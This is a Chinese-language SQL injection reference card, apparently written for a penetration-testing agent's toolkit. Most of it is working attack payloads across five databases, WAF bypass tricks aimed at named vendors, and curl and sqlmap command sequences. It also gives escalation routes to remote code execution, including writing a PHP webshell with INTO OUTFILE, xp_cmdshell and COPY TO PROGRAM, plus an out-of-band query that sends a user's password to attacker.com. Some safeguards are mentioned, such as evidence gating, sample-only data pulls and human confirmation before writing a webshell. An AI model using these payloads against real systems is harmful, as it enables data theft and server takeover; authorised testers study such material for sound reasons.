---
name: sqli
description: SQL Injection Light Deep Card — 五大数据库语法适配 / 11 类 sink / WAF 绕过 / 升 RCE 链。Boolean / Time / Error / Union / OOB 五种检测模式 + 后利用路径。
category: vuln
tags: [server, sqli, injection, database]
---

# SQL Injection (SQLi) — Light Deep Card

> **CWE**: 89 | **OWASP**: A03:2021 (Injection) | **ROI**: 极高 (P0 — RCE 或读全库 → Critical)
> **轻便原则**: 本文件 = 决策卡 + 五数据库适配 + 绕过 + 升级链;深度构造思路 → [../payload-construction/sqli-construction.md](../payload-construction/sqli-construction.md)。

---

## 1. First-pass Signal (探测五要素)

| Payload | 检测原理 | 阳性信号 |
| :--- | :--- | :--- |
| `id=1 AND 1=1` vs `id=1 AND 1=2` | Boolean | 响应长度 / 状态码差异 |
| `id=1' AND SLEEP(5)--` | Time-based | 响应延迟 ≥ 5s |
| `id=1'` (单引号) | Error-based | 500 + SQL 错误信息 |
| `id=1 UNION SELECT NULL,NULL--` | Union-based | 字段数对齐后无错误 |
| `id=1 AND LOAD_FILE('\\\\OOB.dnslog\\x')` | OOB | DNSLog 收到查询 |

记录信号三要素: `HTTP_CODE` / `RESP_LENGTH_DELTA` / `TIMING_DELAY`。

**禁止**: 未确认信号就跑 `sqlmap` (浪费时间 + WAF 封) — 见 §8 工具门槛。

---

## 2. Attack Surface (常见入口)

| 入口 | 典型位置 | 注意 |
| :--- | :--- | :--- |
| **GET 参数** | `?id=`, `?cat=`, `?page=` | 最常见但被关注最多 |
| **POST 参数** | login / search / filter form | 隐蔽性高 |
| **JSON Body** | `{"id":1}` | 后端如果 cast int 没问题,字符串字段可注入 |
| **路径段** | `/product/123` | 部分框架 cast,部分不 |
| **Header** | `User-Agent` / `X-Forwarded-For` / `Cookie` | 日志写库时触发 — Stored SQLi |
| **Cookie** | session / preference | 后端解析后用于 SQL |
| **Order-by / Sort 参数** | `?sort=name` | 字段名注入位置,引号一般用不上 |
| **GraphQL filter** | `where: { field: ... }` | 复杂对象,过滤难全 |
| **Search 参数** | `?q=` | 通常 LIKE 模糊查询,有 wildcard |
| **导入 / 批量操作** | CSV / Excel | 字段串接进 SQL |
| **Stored 触发点** | 注册昵称 → 后台审核页查询 | 二阶 SQLi |

---

## 3. High-Value Targets (按 ROI)

1. **登录 / 密码重置** — 绕过认证 → 任意账号登录 (P0)
2. **搜索 + 导出 / 报表** — UNION 拉全表 (P0)
3. **管理后台过滤器** — DBA 权限 + xp_cmdshell → RCE (P0)
4. **支付 / 订单查询** — 跨用户数据 (P0)
5. **API v0 / v1 老接口** — 老代码无 ORM,字符串拼接多 (P0)
6. **报表参数 / SQL Builder 类接口** — 部分字段透传给 SQL (P0)
7. **WAF 落不到的 Header / Cookie** — 不在常规拦截范围 (P0-P1)

---

## 4. Context 识别 — 决策树

```
反射或差异确认 → 看注入点上下文:
  ├─ 数值字段 (id, count, age)        → §5.A 数值注入 (无需引号)
  ├─ 字符串字段 (name, email)         → §5.B 字符串注入 (要闭合引号)
  ├─ ORDER BY / GROUP BY 字段名        → §5.C 字段名注入
  ├─ LIKE 模糊查询                     → §5.D LIKE 注入 (% 通配符)
  ├─ INSERT / UPDATE / DELETE          → §5.E DML 注入
  ├─ 嵌套查询 / Subquery               → §5.F 子查询注入
  └─ 不返回结果 (盲)                   → §5.G Blind (Boolean/Time/OOB)
```

---

## 5. 数据库语法适配

### 5.A 通用 (所有 DB)

```sql
1 AND 1=1
1 AND 1=2
1 OR 1=1
```

### 5.B MySQL / MariaDB

```sql
-- Boolean
?id=1 AND (SELECT 1)=1
?id=1 AND ASCII(SUBSTRING((SELECT user()),1,1))>64

-- Time-based
?id=1 AND SLEEP(5)
?id=1 AND IF(ASCII(SUBSTR(database(),1,1))>64,SLEEP(5),0)
?id=1 AND BENCHMARK(5000000,MD5(1))

-- Error-based (MySQL >= 5.1)
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))
?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)

-- Union
?id=-1 UNION SELECT 1,2,3,database(),user()

-- OOB (Windows MySQL)
?id=1 AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))

-- RCE (DBA + FILE)
?id=-1 UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/x.php'
```

### 5.C PostgreSQL

```sql
-- Time
1; SELECT pg_sleep(5)--
-- Stacked queries supported
1; INSERT INTO users VALUES (...)--
-- Command execution (CVE-2019-9193 historical)
1; COPY (SELECT 1) TO PROGRAM 'id'--
-- Error
1 AND 1/0=1
```

### 5.D MSSQL

```sql
-- Stacked queries supported by default
1; WAITFOR DELAY '0:0:5'--
-- Error
1 AND CONVERT(int,(SELECT @@version))=1
-- xp_cmdshell (DBA + 启用)
1; EXEC master..xp_cmdshell 'whoami'--
```

### 5.E Oracle

```sql
-- Time
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1
-- Error
1 AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) FROM dual) IS NULL
-- Union (注意 dual)
1 UNION SELECT 1,2,3 FROM dual
```

### 5.F SQLite

```sql
-- Time
1 AND CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END
-- Error
1 AND 1=load_extension('a','b')
```

---

## 6. Bypass Techniques (WAF 绕过)

| 过滤 | 绕过 |
| :--- | :--- |
| 拦 `select` | 大小写 `SeLeCt` / `/*!50000select*/` (MySQL 注释) / `%73elect` URL 编码 |
| 拦 `union select` | 加注释 `union/**/select` / `union all select` / `%a0` 空格替换 |
| 拦 空格 | `/**/` 注释 / `+` / `()` 包裹 / `%09` `%0a` `%0b` `%0c` `%0d` `%a0` |
| 拦单引号 `'` | URL 编码 `%27` / 双重编码 `%2527` / 宽字节 `%bf%27` (GBK) |
| 拦 `=` | `LIKE` / `IN()` / `BETWEEN` |
| 拦 `AND` / `OR` | `&&` / `||` (MySQL) |
| 拦 `sleep` | `benchmark()` / `gtid_subset(...)` / cartesian join 拖延 |
| 拦 `or 1=1` | `or true` / `or 0x1=0x1` |
| 关键字长度限制 | 短 payload `'or'1'='1` |
| 拦 `--` 注释 | `#` / `/* */` |
| 拦 `0x...` 十六进制 | `char(0x41)` / `concat(unhex('41'))` |
| Cast int 防御 | 改用 OOB / Header / Cookie 入口 |
| WAF 检测请求体大小 | 大量无意义参数 + 把 payload 藏在中间 |

### 6.1 国内 WAF 实战

- **阿里云盾**: 对 `union select` 极敏感,试 `union(select)` 加括号 / `union%0aselect`
- **腾讯 T-Sec**: 对完整 payload 敏感,把 payload 分散在多 param + 拼回
- **安全狗**: `union/*` 后跟换行 `\n` (URL 编码 `%0a`) 经常过
- **D 盾**: 对 `xp_cmdshell` 等强敏感词敏感,改 `xp_/*a*/cmdshell`
- **CDN-WAF**: 大体积 POST + chunked encoding 可绕

---

## 7. Testing Methodology

```bash
# Step 1: 找差异参数 (Phase 2 必跑)
# 用唯一 token 测每个参数
for param in id user_id order_id pid cat sort; do
  curl -s "https://target/api?$param=1" | wc -c
  curl -s "https://target/api?$param=1'" | wc -c    # 单引号是否报错
  curl -s "https://target/api?$param=1 AND 1=1" | wc -c
  curl -s "https://target/api?$param=1 AND 1=2" | wc -c
done

# Step 2: Boolean 确认 (响应差异)
# 1=1 vs 1=2 出现 RESP_LENGTH_DELTA → Boolean SQLi

# Step 3: 数据库指纹 (确认后)
curl "https://target/api?id=1 AND @@version LIKE '%MySQL%'"  # MySQL?
curl "https://target/api?id=1 AND substring(version(),1,1)='5'"

# Step 4: 字段数对齐 (Union)
curl "https://target/api?id=1 ORDER BY 1"   # 200
curl "https://target/api?id=1 ORDER BY 10"  # 500 (说明字段 < 10)
# 二分法定位字段数

# Step 5: Union 拉数据
curl "https://target/api?id=-1 UNION SELECT 1,2,database(),user(),version()"

# Step 6: 工具接管 (Evidence-gated, §1 信号确认后才用)
sqlmap -u "https://target/api?id=1" --batch --random-agent --level=3 --risk=2
sqlmap -r req.txt --batch --tamper=space2comment
```

---

## 8. 工具门槛 (Evidence-gated)

**禁止顺序**:
- ❌ 先跑 sqlmap → 找到了再分析: WAF 触发 + IP 封 + 浪费时间
- ❌ 整站 sqlmap --crawl: OPSEC 灾难

**正确顺序**:
1. 手工确认 §1 First-pass 信号 ≥1 个阳性
2. 手工确认 Context (§4)
3. 手工跑 1-2 个针对性 payload (§5)
4. ONLY THEN sqlmap (`-r req.txt` 提供精准请求)

---

## 9. Triage (现象 → 下一步)

| 现象 | 可能原因 | 下一步 |
| :--- | :--- | :--- |
| 200 OK 但无差异 | 参数 cast(int) / 服务端过滤 | 试算术等价 `id=2-1` / 试其他入口 (Header/Cookie) |
| 403 Forbidden | WAF 拦截 | 暂停 SQLi,Grep `waf-bypass.md`,试 §6 |
| 500 Error 无回显 | Error masked | 切 Blind-Time (§5.B SLEEP) |
| 时间差异不明显 | 数据库小 / 网络抖动 | 增大 SLEEP 到 10s / 用 BENCHMARK |
| Boolean 1=1 vs 1=2 都 200 | 应用本身就总 200 | 看响应体长度差异 + 看 Body 内容差异 |
| 引号过但 `and` 过滤 | 部分关键字过滤 | 试 `&&` (MySQL) / `\|\|` (Oracle) |
| Union 列数对不上 | 不知字段数 | ORDER BY 二分法 |
| 找到字段位置但内容不显 | 显示位被 cast | 用 `CONCAT(field)` / 看其他显示位 |

---

## 10. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| Boolean 差异但只有几字节 | 可能是日志 timestamp / CSRF token 变化,试 100 次取众数 |
| Time-based 命中但是服务卡 | 慢查询 vs 真注入 — 测 10s + 控制变量 |
| sqlmap 报"is vulnerable"但手测不出 | 多半是误报,要求 sqlmap 给出具体 payload 手测 |
| 500 + SQL 错误关键字 | 不一定是注入点,可能只是错误页泄露 SQL — 看错误是否随 payload 变 |
| Union 返回 200 但内容空 | 字段类型不匹配,改 `NULL` 占位试 |
| OOB 命中但不稳定 | 服务侧 DNS 缓存 — 每次换子域 |

---

## 11. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| Union 拉 users 表 | 全用户密码哈希 → 离线爆破 | Critical |
| Boolean 拉 admin 密码 | 直接登录后台 | Critical |
| DBA + xp_cmdshell (MSSQL) | RCE | Critical |
| MySQL FILE 权限 + OUTFILE | 写 WebShell | Critical (HITL 必确认) |
| PostgreSQL COPY ... PROGRAM | RCE (CVE-2019-9193) | Critical |
| Oracle java source | RCE | Critical |
| LOAD_FILE 读 /etc/passwd / config | 服务器文件读 | High |
| 二阶 / Stored SQLi (注册名注入) | 后台管理员触发 → 内部接管 | Critical |
| 时间盲注 + 自动化 | 全库拖 (慢但稳) | Critical |

**证据 (P3.5)**: 
- 拉数据时**只取 5 条样本**,字段脱敏后截图 (用户名后缀打码 / 邮箱 @ 前打码)
- 不要 `SELECT *`,只取证明性字段
- 写 WebShell 前 HITL 确认,改用 OOB 验证 RCE 即可

---

## 12. Pro Tips

- **First-pass 用唯一 token**: `'<random>` 避免被其他参数变化迷惑
- **WAF 试探"安全 payload"**: 先发 `' OR 'a'='a` 看是否封,再决定走哪种绕过
- **数值字段先试算术等价** (`id=2-1`) — 很多过滤只查关键字
- **Cookie / Header 注入易被忽略**: Burp 测试时手动加 `'` 测每个 Header
- **二阶 SQLi 高 ROI**: 注册时塞 payload,后台审核时触发,绕过前端 WAF
- **GraphQL filter 注入**: `where: { id: "1' OR 1=1--" }` — 复杂对象 WAF 难全覆盖
- **WAF 探测响应特征**: 看 `Server` Header / 看封禁页 — 不同 WAF 不同响应
- **国内云 DB**: 阿里云 RDS / 腾讯 CDB 默认禁用 LOAD_FILE / xp_cmdshell — 不死磕 RCE,转读数据 + 横向
- **JSON 注入易过 WAF**: WAF 对 JSON body 检测弱,字符串字段藏 payload
- **大小写绕过现代 WAF 多失效** — 优先试 inline 注释 `/*!*/` 和 URL 编码

---

## 13. 工具升级线

**classic 版**:
- 自动化: `sqlmap` (evidence-gated)
- 二阶: 手工 + sqlmap `--second-url`
- 字典: SecLists / PayloadsAllTheThings

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多 payload (Boolean + Time + Error)
- `mcp__yaklang__exec_codec` 链式 URL 编码 / 双编码 / 宽字节
- `mcp__yaklang__ssa_compile language="java/php/js"` + SyntaxFlow 找 SQL string concatenation sink

---

## 14. 相关参考

- 构造思路: [../payload-construction/sqli-construction.md](../payload-construction/sqli-construction.md)
- WAF 绕过: [../waf-bypass.md](../waf-bypass.md)
- 反序列化关联 (Fastjson + SQLi 链): [fastjson-jackson.md](fastjson-jackson.md)
- 文件上传 (RCE 终态): [upload.md](upload.md)
- OOB 通道: [../oob-infrastructure.md](../oob-infrastructure.md)
- 敏感信息利用: [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- 报告模板: [../report-template.md](../report-template.md)
- 直觉触发 (发现 SQLi 后 sweep 全站同类参数): [../intuition-triggers.md](../intuition-triggers.md)
